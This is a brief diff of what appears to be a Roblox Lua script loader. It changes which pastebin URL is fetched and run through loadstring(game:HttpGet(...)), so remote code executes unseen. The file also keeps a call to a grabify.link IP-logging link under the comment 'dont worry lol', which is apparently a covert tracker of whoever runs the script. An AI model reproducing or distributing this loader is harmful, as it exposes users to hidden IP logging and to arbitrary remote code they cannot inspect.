@@ -1,4 +1,4 @@
-loadstring(game:HttpGet('https://pastebin.com/raw/85GQ24bc'))()
+loadstring(game:HttpGet('https://pastebin.com/raw/qepN1Fb2'))()
 
 --dont worry lol
 loadstring(game:HttpGet('https://grabify.link/1MDJ76'))()
